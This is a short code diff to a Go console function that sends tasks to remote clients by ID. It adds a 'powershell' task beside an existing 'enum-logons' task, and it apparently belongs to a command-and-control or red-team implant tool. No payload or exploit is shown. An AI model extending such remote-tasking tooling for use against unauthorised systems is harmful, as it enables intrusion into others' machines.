@@ -816,6 +816,8 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskWithArgs(c, clientId, command, "<user> <group>: ")
 	case "enum-logons":
 		PrepareTaskSimple(c, clientId, command)
+	case "powershell":
+		PrepareTaskWithArgs(c, clientId, command, "<Get-ChildItem -force -something -test>: ")
 	default:
 		c.Println("Task not found.")
 	}
